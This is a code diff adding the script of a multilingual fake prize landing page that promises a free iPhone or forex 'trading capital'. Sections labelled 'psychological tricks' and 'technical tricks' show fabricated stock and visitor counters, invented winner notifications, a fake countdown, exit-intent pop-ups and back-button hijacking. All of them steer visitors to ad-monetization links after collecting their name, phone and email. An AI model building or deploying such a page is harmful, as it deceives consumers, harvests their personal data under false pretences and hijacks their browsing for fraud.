+                    emailLabel: 'メールアドレス:',
+                    btnText: '今すぐ賞品をゲット',
+                    offersTitle: '当選確率を上げるために、追加オファーを選びましょう:',
+                    badge1: '100% 安全',
+                    badge2: 'データ保護',
+                    badge3: '無料配送',
+                    footerText: '© 2024 デイリーリワード。全著作権所有。',
+                    privacyLink: 'プライバシー',
+                    termsLink: '利用規約',
+                    contactLink: 'お問い合わせ',
+                    liveStats: ' 人が現在視聴中！',
+                    stockText: ' 賞品のみ残り！',
+                    loadingText: 'あなたに最適なオファーを読み込み中...',
+                    validationName: '氏名を入力してください',
+                    validationPhone: '有効な電話番号を入力してください',
+                    validationEmail: '有効なメールアドレスを入力してください',
+                    successMessage: '🎉 成功！賞品ページにリダイレクト中...',
+                    exitMessage: '🎁 待って！去る前に特別オファー！'
+                }
+            },
+            ko: {
+                code: 'ko',
+                name: '한국어',
+                flag: '🇰🇷',
+                dir: 'ltr',
+                translations: {
+                    siteName: '데일리 리워드',
+                    mainTitle: '🎁 즉시 당첨! iPhone 14 Pro 무료로 받기',
+                    subtitle: '지금 참여하여 즉시 당첨 기회. 100% 무료!',
+                    prizeTitle: 'iPhone 14 Pro Max',
+                    prizeValue: '상품 가치: $1,299',
+                    prizeDesc: '상품을 선택하고 참여하여 당첨',
+                    step1Title: '상품 선택',
+                    step1Desc: '수십 가지 가치 있는 상품 중 선택',
+                    step2Title: '정보 입력',
+                    step2Desc: '확인을 위한 간단한 정보',
+                    step3Title: '상품 받기',
+                    step3Desc: '24시간 이내 배송',
+                    countdownTitle: '⏰ 추첨 종료까지:',
+                    hourLabel: '시간',
+                    minuteLabel: '분',
+                    secondLabel: '초',
+                    nameLabel: '성명:',
+                    phoneLabel: '전화번호:',
+                    emailLabel: '이메일 주소:',
+                    btnText: '지금 상품 받기',
+                    offersTitle: '당첨 확률을 높이려면 추가 혜택을 선택하세요:',
+                    badge1: '100% 안전',
+                    badge2: '데이터 보호',
+                    badge3: '무료 배송',
+                    footerText: '© 2024 데일리 리워드. 모든 권리 보유.',
+                    privacyLink: '개인정보',
+                    termsLink: '이용약관',
+                    contactLink: '문의하기',
+                    liveStats: ' 명이 지금 시청 중!',
+                    stockText: ' 개 상품만 남음!',
+                    loadingText: '최고의 혜택을 로드 중...',
+                    validationName: '성명을 입력해 주세요',
+                    validationPhone: '유효한 전화번호를 입력해 주세요',
+                    validationEmail: '유효한 이메일 주소를 입력해 주세요',
+                    successMessage: '🎉 성공! 상품 페이지로 이동 중...',
+                    exitMessage: '🎁 잠깐! 떠나기 전 특별 혜택!'
+                }
+            },
+            pt: {
+                code: 'pt',
+                name: 'Português',
+                flag: '🇧🇷',
+                dir: 'ltr',
+                translations: {
+                    siteName: 'Recompensas Diárias',
+                    mainTitle: '🎁 Ganho Instantâneo! Ganhe iPhone 14 Pro Grátis',
+                    subtitle: 'Participe agora para ganhar instantaneamente. 100% Grátis!',
+                    prizeTitle: 'iPhone 14 Pro Max',
+                    prizeValue: 'Valor do Prêmio: $1.299',
+                    prizeDesc: 'Escolha seu prêmio e participe para ganhar',
+                    step1Title: 'Escolha Seu Prêmio',
+                    step1Desc: 'Selecione entre dezenas de prêmios valiosos',
+                    step2Title: 'Insira Seus Dados',
+                    step2Desc: 'Informações simples para verificação',
+                    step3Title: 'Receba Seu Prêmio',
+                    step3Desc: 'Será entregue em 24 horas',
+                    countdownTitle: '⏰ O sorteio termina em:',
+                    hourLabel: 'Horas',
+                    minuteLabel: 'Minutos',
+                    secondLabel: 'Segundos',
+                    nameLabel: 'Nome Completo:',
+                    phoneLabel: 'Número de Telefone:',
+                    emailLabel: 'Endereço de Email:',
+                    btnText: 'Receba Seu Prêmio Agora',
+                    offersTitle: 'Para aumentar suas chances de ganhar, escolha ofertas adicionais:',
+                    badge1: '100% Seguro',
+                    badge2: 'Dados Protegidos',
+                    badge3: 'Entrega Grátis',
+                    footerText: '© 2024 Recompensas Diárias. Todos os direitos reservados.',
+                    privacyLink: 'Privacidade',
+                    termsLink: 'Termos',
+                    contactLink: 'Contato',
+                    liveStats: ' pessoas assistindo agora!',
+                    stockText: ' prêmios restantes apenas!',
+                    loadingText: 'Carregando as melhores ofertas para você...',
+                    validationName: 'Por favor, insira seu nome completo',
+                    validationPhone: 'Por favor, insira um número de telefone válido',
+                    validationEmail: 'Por favor, insira um endereço de email válido',
+                    successMessage: '🎉 Sucesso! Redirecionando para seu prêmio...',
+                    exitMessage: '🎁 Espere! Oferta especial antes de sair!'
+                }
+            },
+            tr: {
+                code: 'tr',
+                name: 'Türkçe',
+                flag: '🇹🇷',
+                dir: 'ltr',
+                translations: {
+                    siteName: 'Günlük Ödüller',
+                    mainTitle: '🎁 Anlık Kazanç! iPhone 14 Pro Ücretsiz Alın',
+                    subtitle: 'Anında kazanmak için hemen katılın. %100 Ücretsiz!',
+                    prizeTitle: 'iPhone 14 Pro Max',
+                    prizeValue: 'Ödül Değeri: $1.299',
+                    prizeDesc: 'Ödülünüzü seçin ve kazanmak için katılın',
+                    step1Title: 'Ödülünüzü Seçin',
+                    step1Desc: 'Onlarca değerli ödül arasından seçin',
+                    step2Title: 'Bilgilerinizi Girin',
+                    step2Desc: 'Doğrulama için basit bilgiler',
+                    step3Title: 'Ödülünüzü Alın',
+                    step3Desc: '24 saat içinde teslim edilecek',
+                    countdownTitle: '⏰ Çekiliş bitmesine:',
+                    hourLabel: 'Saat',
+                    minuteLabel: 'Dakika',
+                    secondLabel: 'Saniye',
+                    nameLabel: 'Tam Adı:',
+                    phoneLabel: 'Telefon Numarası:',
+                    emailLabel: 'E-posta Adresi:',
+                    btnText: 'Ödülünüzü Hemen Alın',
+                    offersTitle: 'Kazanma şansınızı artırmak için ek teklifler seçin:',
+                    badge1: '%100 Güvenli',
+                    badge2: 'Veri Korunmuş',
+                    badge3: 'Ücretsiz Teslimat',
+                    footerText: '© 2024 Günlük Ödüller. Tüm hakları saklıdır.',
+                    privacyLink: 'Gizlilik',
+                    termsLink: 'Şartlar',
+                    contactLink: 'İletişim',
+                    liveStats: ' kişi şu anda izliyor!',
+                    stockText: ' ödül sadece kaldı!',
+                    loadingText: 'Sizin için en iyi teklifler yükleniyor...',
+                    validationName: 'Lütfen tam adınızı girin',
+                    validationPhone: 'Lütfen geçerli bir telefon numarası girin',
+                    validationEmail: 'Lütfen geçerli bir e-posta adresi girin',
+                    successMessage: '🎉 Başarı! Ödülünüze yönlendiriliyor...',
+                    exitMessage: '🎁 Bekleyin! Ayrılmadan önce özel teklif!'
+                }
+            },
+            hi: {
+                code: 'hi',
+                name: 'हिन्दी',
+                flag: '🇮🇳',
+                dir: 'ltr',
+                translations: {
+                    siteName: 'दैनिक पुरस्कार',
+                    mainTitle: '🎁 तुरंत जीतें! iPhone 14 Pro मुफ्त पाएं',
+                    subtitle: 'तुरंत जीतने का मौका पाने के लिए अभी शामिल हों। 100% मुफ्त!',
+                    prizeTitle: 'iPhone 14 Pro Max',
+                    prizeValue: 'पुरस्कार मूल्य: $1,299',
+                    prizeDesc: 'अपना पुरस्कार चुनें और जीतने के लिए शामिल हों',
+                    step1Title: 'अपना पुरस्कार चुनें',
+                    step1Desc: 'कई मूल्यवान पुरस्कारों में से चुनें',
+                    step2Title: 'अपना विवरण दर्ज करें',
+                    step2Desc: 'सत्यापन के लिए सरल जानकारी',
+                    step3Title: 'अपना पुरस्कार प्राप्त करें',
+                    step3Desc: '24 घंटे के भीतर वितरित किया जाएगा',
+                    countdownTitle: '⏰ ड्रॉ समाप्त होता है:',
+                    hourLabel: 'घंटे',
+                    minuteLabel: 'मिनट',
+                    secondLabel: 'सेकंड',
+                    nameLabel: 'पूरा नाम:',
+                    phoneLabel: 'फोन नंबर:',
+                    emailLabel: 'ईमेल पता:',
+                    btnText: 'अभी अपना पुरस्कार प्राप्त करें',
+                    offersTitle: 'जीतने की संभावना बढ़ाने के लिए, अतिरिक्त ऑफ़र चुनें:',
+                    badge1: '100% सुरक्षित',
+                    badge2: 'डेटा संरक्षित',
+                    badge3: 'मुफ्त डिलीवरी',
+                    footerText: '© 2024 दैनिक पुरस्कार। सर्वाधिकार सुरक्षित।',
+                    privacyLink: 'गोपनीयता',
+                    termsLink: 'शर्तें',
+                    contactLink: 'संपर्क करें',
+                    liveStats: ' लोग अभी देख रहे हैं!',
+                    stockText: ' पुरस्कार केवल बचे हैं!',
+                    loadingText: 'आपके लिए सर्वोत्तम ऑफ़र लोड हो रहे हैं...',
+                    validationName: 'कृपया अपना पूरा नाम दर्ज करें',
+                    validationPhone: 'कृपया एक वैध फोन नंबर दर्ज करें',
+                    validationEmail: 'कृपया एक वैध ईमेल पता दर्ज करें',
+                    successMessage: '🎉 सफलता! आपके पुरस्कार पर पुनर्निर्देशित...',
+                    exitMessage: '🎁 रुकिए! जाने से पहले विशेष ऑफ़र!'
+                }
+            }
+        };
+
+        // ==================== 2. LANGUAGE MANAGEMENT ====================
+        function detectUserLanguage() {
+            // 1. Check URL parameter
+            const urlParams = new URLSearchParams(window.location.search);
+            const langParam = urlParams.get('lang');
+            if (langParam && languages[langParam]) {
+                return langParam;
+            }
+            
+            // 2. Check browser language
+            const browserLang = navigator.language.split('-')[0];
+            if (languages[browserLang]) {
+                return browserLang;
+            }
+            
+            // 3. Check browser languages list
+            const browserLangs = navigator.languages || [];
+            for (let lang of browserLangs) {
+                const langCode = lang.split('-')[0];
+                if (languages[langCode]) {
+                    return langCode;
+                }
+            }
+            
+            // 4. Check geographic location based on IP (simulated)
+            const geoLanguages = {
+                'US': 'en', 'GB': 'en', 'CA': 'en',
+                'ES': 'es', 'MX': 'es', 'AR': 'es',
+                'FR': 'fr', 'BE': 'fr', 'CH': 'fr',
+                'DE': 'de', 'AT': 'de', 'CH': 'de',
+                'SA': 'ar', 'AE': 'ar', 'EG': 'ar',
+                'RU': 'ru', 'UA': 'ru', 'BY': 'ru',
+                'CN': 'zh', 'TW': 'zh', 'HK': 'zh',
+                'JP': 'ja',
+                'KR': 'ko',
+                'BR': 'pt', 'PT': 'pt',
+                'TR': 'tr',
+                'IN': 'hi'
+            };
+            
+            // Simulate geo detection (in real scenario, use IP API)
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            for (let country in geoLanguages) {
+                if (timezone.includes(country)) {
+                    return geoLanguages[country];
+                }
+            }
+            
+            // 5. Default to English
+            return 'en';
+        }
+
+        function setLanguage(langCode) {
+            const lang = languages[langCode];
+            if (!lang) return;
+            
+            // Save to localStorage
+            localStorage.setItem('preferred_language', langCode);
+            
+            // Update HTML direction
+            document.documentElement.dir = lang.dir;
+            document.documentElement.lang = lang.code;
+            
+            // Update language selector
+            document.getElementById('currentFlag').textContent = lang.flag;
+            document.getElementById('currentLang').textContent = lang.code.toUpperCase();
+            
+            // Apply translations
+            applyTranslations(lang.translations);
+            
+            // Close dropdown
+            document.getElementById('langDropdown').classList.remove('active');
+            
+            // Track language change
+            trackEvent('language_changed', langCode);
+        }
+
+        function applyTranslations(translations) {
+            // Update all translatable elements
+            document.getElementById('siteName').textContent = translations.siteName;
+            document.getElementById('mainTitle').textContent = translations.mainTitle;
+            document.getElementById('subtitle').textContent = translations.subtitle;
+            document.getElementById('prizeTitle').textContent = translations.prizeTitle;
+            document.getElementById('prizeValue').textContent = translations.prizeValue;
+            document.getElementById('prizeDesc').textContent = translations.prizeDesc;
+            document.getElementById('step1Title').textContent = translations.step1Title;
+            document.getElementById('step1Desc').textContent = translations.step1Desc;
+            document.getElementById('step2Title').textContent = translations.step2Title;
+            document.getElementById('step2Desc').textContent = translations.step2Desc;
+            document.getElementById('step3Title').textContent = translations.step3Title;
+            document.getElementById('step3Desc').textContent = translations.step3Desc;
+            document.getElementById('countdownTitle').textContent = translations.countdownTitle;
+            document.getElementById('hourLabel').textContent = translations.hourLabel;
+            document.getElementById('minuteLabel').textContent = translations.minuteLabel;
+            document.getElementById('secondLabel').textContent = translations.secondLabel;
+            document.getElementById('nameLabel').textContent = translations.nameLabel;
+            document.getElementById('phoneLabel').textContent = translations.phoneLabel;
+            document.getElementById('emailLabel').textContent = translations.emailLabel;
+            document.getElementById('btnText').textContent = translations.btnText;
+            document.getElementById('offersTitle').textContent = translations.offersTitle;
+            document.getElementById('badge1').textContent = translations.badge1;
+            document.getElementById('badge2').textContent = translations.badge2;
+            document.getElementById('badge3').textContent = translations.badge3;
+            document.getElementById('footerText').textContent = translations.footerText;
+            document.getElementById('privacyLink').textContent = translations.privacyLink;
+            document.getElementById('termsLink').textContent = translations.termsLink;
+            document.getElementById('contactLink').textContent = translations.contactLink;
+            document.getElementById('spinnerText').textContent = translations.loadingText;
+            
+            // Update placeholders
+            document.getElementById('name').placeholder = translations.nameLabel;
+            document.getElementById('phone').placeholder = translations.phoneLabel;
+            document.getElementById('email').placeholder = translations.emailLabel;
+        }
+
+        function setupLanguageSelector() {
+            const dropdown = document.getElementById('langDropdown');
+            
+            // Clear existing options
+            dropdown.innerHTML = '';
+            
+            // Add all available languages
+            for (const [code, lang] of Object.entries(languages)) {
+                const option = document.createElement('div');
+                option.className = 'lang-option';
+                option.innerHTML = `
+                    <span class="lang-flag">${lang.flag}</span>
+                    <span>${lang.name}</span>
+                `;
+                option.onclick = () => setLanguage(code);
+                dropdown.appendChild(option);
+            }
+            
+            // Toggle dropdown
+            document.getElementById('langBtn').onclick = () => {
+                dropdown.classList.toggle('active');
+            };
+            
+            // Close dropdown when clicking outside
+            document.addEventListener('click', (e) => {
+                if (!e.target.closest('.language-selector')) {
+                    dropdown.classList.remove('active');
+                }
+            });
+        }
+
+        // ==================== 3. NICHE SYSTEM ====================
+        const niches = {
+            tech: {
+                name: 'Technology',
+                colors: {
+                    primary: '#1a73e8',
+                    secondary: '#4285f4',
+                    headerPrimary: '#ea4335',
+                    headerSecondary: '#fbbc04',
+                    accent: '#34a853',
+                    imagePrimary: '#4285f4',
+                    imageSecondary: '#34a853',
+                    btnPrimary: '#1a73e8',
+                    btnSecondary: '#4285f4',
+                    offerPrimary: '#8e2de2',
+                    offerSecondary: '#4a00e0',
+                    countdownPrimary: '#ff8a00',
+                    countdownSecondary: '#da1b60'
+                },
+                content: {
+                    siteName: 'Tech Rewards',
+                    mainTitle: '📱 Instant Win! Get Latest Tech Gadgets Free',
+                    prizeIcon: 'fa-laptop',
+                    prizeTitle: 'iPhone 15 Pro Max',
+                    prizeValue: 'Prize Value: $1,499',
+                    prizeDesc: 'Latest Apple phone with advanced camera',
+                    offers: [
+                        {icon: 'fa-mobile-alt', text: 'iPhone 15 Pro Free', type: 'iphone'},
+                        {icon: 'fa-laptop', text: 'MacBook Pro 2024', type: 'macbook'},
+                        {icon: 'fa-headphones', text: 'AirPods Pro 2', type: 'airpods'}
+                    ]
+                }
+            },
+            forex: {
+                name: 'Forex Trading',
+                colors: {
+                    primary: '#00d09c',
+                    secondary: '#00b894',
+                    headerPrimary: '#0984e3',
+                    headerSecondary: '#00cec9',
+                    accent: '#fdcb6e',
+                    imagePrimary: '#00b894',
+                    imageSecondary: '#0984e3',
+                    btnPrimary: '#00d09c',
+                    btnSecondary: '#00b894',
+                    offerPrimary: '#00b894',
+                    offerSecondary: '#0984e3',
+                    countdownPrimary: '#ff8a00',
+                    countdownSecondary: '#da1b60'
+                },
+                content: {
+                    siteName: 'Trading Academy',
+                    mainTitle: '💰 Instant Win! Get Trading Capital Free',
+                    prizeIcon: 'fa-chart-line',
+                    prizeTitle: 'Trading Capital $5,000',
+                    prizeValue: 'Prize Value: $5,000',
+                    prizeDesc: 'Free capital for global market trading',
+                    offers: [
+                        {icon: 'fa-chart-line', text: 'Free Trading Account', type: 'forex_account'},
+                        {icon: 'fa-graduation-cap', text: 'Professional Course', type: 'trading_course'},
+                        {icon: 'fa-bell', text: 'Daily Trading Signals', type: 'signals'}
+                    ]
+                }
+            }
+        };
+
+        function detectUserNiche() {
+            // Based on traffic source
+            const referrer = document.referrer.toLowerCase();
+            if (referrer.includes('tech') || referrer.includes('gadget')) return 'tech';
+            if (referrer.includes('forex') || referrer.includes('trading')) return 'forex';
+            
+            // Based on language (some niches perform better in certain languages)
+            const lang = localStorage.getItem('preferred_language') || 'en';
+            if (['ar', 'tr', 'ru'].includes(lang)) return 'forex';
+            if (['zh', 'ja', 'ko'].includes(lang)) return 'tech';
+            
+            // Random default
+            return Math.random() > 0.5 ? 'tech' : 'forex';
+        }
+
+        function applyNiche(nicheKey) {
+            const niche = niches[nicheKey];
+            if (!niche) return;
+            
+            // Apply colors
+            const root = document.documentElement;
+            const colors = niche.colors;
+            
+            for (const [key, value] of Object.entries(colors)) {
+                root.style.setProperty(`--${key}`, value);
+            }
+            
+            // Apply niche-specific content
+            const content = niche.content;
+            document.getElementById('siteName').textContent = content.siteName;
+            document.getElementById('mainTitle').textContent = content.mainTitle;
+            document.getElementById('prizeIcon').className = `fas ${content.prizeIcon}`;
+            document.getElementById('prizeTitle').textContent = content.prizeTitle;
+            document.getElementById('prizeValue').textContent = content.prizeValue;
+            document.getElementById('prizeDesc').textContent = content.prizeDesc;
+            
+            // Setup offers
+            setupOffers(content.offers);
+        }
+
+        function setupOffers(offers) {
+            const offersSection = document.getElementById('offersSection');
+            offersSection.innerHTML = `
+                <p style="text-align:center; margin-bottom:15px; color:#666; font-size:14px;" id="offersTitle">
+                    To increase your winning chances, choose additional offers:
+                </p>
+            `;
+            
+            offers.forEach(offer => {
+                const button = document.createElement('button');
+                button.className = 'btn offer-btn';
+                button.innerHTML = `<i class="fas ${offer.icon}"></i> ${offer.text}`;
+                button.onclick = () => openMonetagLink(offer.type);
+                offersSection.appendChild(button);
+            });
+        }
+
+        // ==================== 4. MONETAG SYSTEM ====================
+        function buildMonetagUrl(offerType) {
+            const baseUrl = 'https://your-monetag-link.com/'; // REPLACE WITH YOUR LINK
+            const params = new URLSearchParams({
+                'var': generateUserId(),
+                's': 'multilingual_landing',
+                'lang': localStorage.getItem('preferred_language') || 'en',
+                'niche': localStorage.getItem('user_niche') || 'tech',
+                'offer': offerType,
+                'timestamp': Date.now(),
+                'country': 'auto',
+                'source': document.referrer || 'direct'
+            });
+            
+            return baseUrl + '?' + params.toString();
+        }
+
+        function openMonetagLink(offerType) {
+            const url = buildMonetagUrl(offerType);
+            window.open(url, '_blank');
+            trackEvent('offer_click', offerType);
+        }
+
+        // ==================== 5. PSYCHOLOGICAL TRICKS ====================
+        let fakeStock = 15;
+        let fakeVisitors = 24;
+
+        function updateStock() {
+            fakeStock--;
+            if (fakeStock < 0) fakeStock = Math.floor(Math.random() * 10) + 5;
+            
+            const stockElement = document.getElementById('stockCount');
+            stockElement.textContent = fakeStock;
+            
+            if (fakeStock < 5) {
+                document.getElementById('stockCounter').classList.add('low-stock');
+            }
+        }
+
+        function updateLiveVisitors() {
+            const change = Math.random() > 0.5 ? 1 : -1;
+            fakeVisitors += change;
+            if (fakeVisitors < 15) fakeVisitors = 15;
+            if (fakeVisitors > 50) fakeVisitors = 50;
+            
+            document.getElementById('liveCounter').textContent = fakeVisitors;
+        }
+
+        function showFakeWinners() {
+            const winners = [
+                'John from New York just won iPhone 15!',
+                'Maria from Madrid just won trading capital!',
+                'Ahmed from Dubai just won a free loan!'
+            ];
+            
+            setInterval(() => {
+                const winner = winners[Math.floor(Math.random() * winners.length)];
+                showNotification(`🎉 ${winner}`, 'success');
+            }, 30000);
+        }
+
+        // ==================== 6. TECHNICAL TRICKS ====================
+        function setupAutoScroll() {
+            setTimeout(() => {
+                const form = document.getElementById('name');
+                if (form) {
+                    form.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                    form.focus();
+                }
+            }, 3000);
+        }
+
+        function setupExitIntent() {
+            document.addEventListener('mouseout', (e) => {
+                if (e.clientY < 0) {
+                    openMonetagLink('exit_intent');
+                }
+            });
+        }
+
+        function setupBackButtonRedirect() {
+            window.history.pushState(null, null, window.location.href);
+            window.addEventListener('popstate', () => {
+                window.history.pushState(null, null, window.location.href);
+                openMonetagLink('back_button');
+            });
+        }
+
+        // ==================== 7. COUNTDOWN TIMER ====================
+        function startCountdown() {
+            let hours = 2;
+            let minutes = 30;
+            let seconds = 45;
+            
+            function update() {
+                if (seconds > 0) {
+                    seconds--;
+                } else {
+                    if (minutes > 0) {
+                        minutes--;
+                        seconds = 59;
+                    } else {
+                        if (hours > 0) {
+                            hours--;
+                            minutes = 59;
+                            seconds = 59;
+                        }
+                    }
+                }
+                
+                document.getElementById('hours').textContent = hours.toString().padStart(2, '0');
+                document.getElementById('minutes').textContent = minutes.toString().padStart(2, '0');
+                document.getElementById('seconds').textContent = seconds.toString().padStart(2, '0');
+            }
+            
+            update();
+            setInterval(update, 1000);
+        }
+
+        // ==================== 8. FORM VALIDATION ====================
+        function validateForm() {
+            const name = document.getElementById('name').value.trim();
+            const phone = document.getElementById('phone').value.trim();
+            const email = document.getElementById('email').value.trim();
+            
+            if (!name || !phone || !email) {
+                showNotification('Please fill all required fields', 'error');
+                return false;
+            }
+            
+            if (!email.includes('@') || !email.includes('.')) {
+                showNotification('Please enter valid email address', 'error');
+                return false;
+            }
+            
+            return true;
+        }
+
+        // ==================== 9. TRACKING SYSTEM ====================
+        function generateUserId() {
+            return 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        }
+
+        function trackEvent(action, label) {
+            const eventData = {
+                action,
+                label,
+                lang: localStorage.getItem('preferred_language'),
+                niche: localStorage.getItem('user_niche'),
+                timestamp: new Date().toISOString()
+            };
+            
+            console.log('📊 Event:', eventData);
+        }
+
+        // ==================== 10. NOTIFICATION SYSTEM ====================
+        function showNotification(message, type = 'info') {
+            const colors = {
+                info: 'linear-gradient(135deg, #00b894, #00cec9)',
+                warning: 'linear-gradient(135deg, #ff9f43, #feca57)',
+                error: 'linear-gradient(135deg, #ff6b6b, #ff3838)',
+                success: 'linear-gradient(135deg, #00b894, #00cec9)'
+            };
+
+            const notification = document.createElement('div');
+            notification.style.cssText = `
+                position: fixed;
+                top: 20px;
+                right: 20px;
+                left: 20px;
+                background: ${colors[type]};
+                color: white;
+                padding: 15px;
+                border-radius: 12px;
+                text-align: center;
+                z-index: 10000;
+                animation: slideDown 0.5s;
+                box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+                font-weight: bold;
+            `;
+            notification.textContent = message;
+            document.body.appendChild(notification);
+
+            setTimeout(() => {
+                notification.style.animation = 'slideUp 0.5s';
+                setTimeout(() => {
+                    notification.remove();
+                }, 500);
+            }, 3000);
+        }
+
+        // ==================== 11. MAIN INITIALIZATION ====================
+        document.addEventListener('DOMContentLoaded', function() {
+            // Setup language system
+            setupLanguageSelector();
+            
+            // Detect and set language
+            const userLang = detectUserLanguage();
+            const savedLang = localStorage.getItem('preferred_language');
+            setLanguage(savedLang || userLang);
+            
+            // Detect niche
+            const niche = detectUserNiche();
+            localStorage.setItem('user_niche', niche);
+            applyNiche(niche);
+            
+            // Setup systems
+            startCountdown();
+            setupAutoScroll();
+            setupExitIntent();
+            setupBackButtonRedirect();
+            
+            // Start live updates
+            setInterval(updateStock, 8000);
+            setInterval(updateLiveVisitors, 5000);
+            setTimeout(showFakeWinners, 10000);
+            
+            // Form submission
+            document.getElementById('submitBtn').onclick = (e) => {
+                e.preventDefault();
+                
+                if (validateForm()) {
+                    // Save user data
+                    const userData = {
+                        id: generateUserId(),
+                        name: document.getElementById('name').value,
+                        phone: document.getElementById('phone').value,
+                        email: document.getElementById('email').value,
+                        lang: localStorage.getItem('preferred_language'),
+                        niche: localStorage.getItem('user_niche'),
+                        timestamp: new Date().toISOString()
+                    };
+                    
+                    localStorage.setItem('user_data', JSON.stringify(userData));
+                    trackEvent('form_submitted', 'main_form');
+                    
+                    // Open main offer
+                    openMonetagLink('main_offer');
+                    showNotification('🎉 Success! Redirecting to your prize...', 'success');
+                    
+                    // Open additional offers
+                    setTimeout(() => openMonetagLink('secondary_offer'), 2000);
+                    setTimeout(() => openMonetagLink('bonus_offer'), 4000);
+                }
+            };
+            
+            // Add animations
+            const style = document.createElement('style');
+            style.textContent = `
+                @keyframes slideDown {
+                    from { transform: translateY(-100%); opacity: 0; }
+                    to { transform: translateY(0); opacity: 1; }
+                }
+                @keyframes slideUp {
+                    from { transform: translateY(0); opacity: 1; }
+                    to { transform: translateY(-100%); opacity: 0; }
+                }
+            `;
+            document.head.appendChild(style);
+            
+            console.log('🚀 Multilingual system ready!');
+        });
+    </script>
+</body>
+</html>
